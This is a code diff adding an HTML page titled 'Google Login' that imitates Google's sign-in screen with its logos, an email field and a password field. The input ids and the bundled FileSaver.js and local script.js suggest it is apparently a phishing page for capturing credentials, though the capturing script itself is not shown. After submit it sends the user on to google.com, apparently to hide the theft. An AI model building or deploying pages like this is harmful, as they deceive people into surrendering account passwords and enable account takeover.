@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+
+<link rel="shortcut icon" type="image/jpg" href="google_logo.png"/>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
+<script src="script.js" defer></script>
+
+<head>
+	<title>Google Login</title>
+</head>
+
+<body>
+
+  <center><br><br><img src="googlelogo.png" alt="Google Logo" width="310px" height="110px">
+  <br><img src="modo.png" alt="Google Modo" width="320px" height="70px"><br><br>
+
+<form action="https://accounts.google.com/signup" method="post">
+
+
+  <div class="container">
+
+    <br><img src="pfp.png" alt="Account Logo" width="100px" height="100px"><br><br><br>
+
+    <input type="text" placeholder="Email" name="uname" id="getEmail" required><br>
+
+    <input type="password" placeholder="Password" name="psw" id="getPassword" required><br>
+
+    <button type="submit" onclick="location.href = 'https://google.com'" id="blueButton">Sign In</button><br>
+    <br>
+
+  </div>
+  
+</form> 
+
+
+<br><a href="https://accounts.google.com/signup" style="text-decoration: none; text-decoration-color: blue;">Create an account</a>
+<br><br><img src="bottomart.png" alt="Bottom Art" width="300px" height="60px"><br><br>
+
+</center>
+
+<style >
+	
+ /* Bordered form */
+form {
+  border: 5px solid #f1f1f1;
+  width: 400px;
+
+}
+
+/* Full-width inputs */
+input[type=text], input[type=password] {
+  width: 300px;
+  padding: 12px 20px;
+  margin: 8px 0;
+  display: inline-block;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+}
+
+/* Set a style for all buttons */
+button {
+  background-color: #498af2;
+  color: white;
+  padding: 14px 20px;
+  margin: 8px 0;
+  border: none;
+  cursor: pointer;
+  width: 300px;
+}
+
+/* Add a hover effect for buttons */
+button:hover {
+  opacity: 0.8;
+}
+
+/* Extra style for the cancel button (red) */
+.cancelbtn {
+  width: auto;
+  padding: 10px 18px;
+  background-color: #f44336;
+}
+
+/* Add padding to containers */
+.container {
+  padding: 16px;
+}
+
+/* The "Forgot password" text */
+span.psw {
+  float: right;
+  padding-top: 16px;
+}
+
+/* Change styles for span and cancel button on extra small screens */
+@media screen and (max-width: 300px) {
+  span.psw {
+    display: block;
+    float: none;
+  }
+  .cancelbtn {
+    width: 100%;
+  }
+} 
+
+</style>
+
+</body>
+</html>
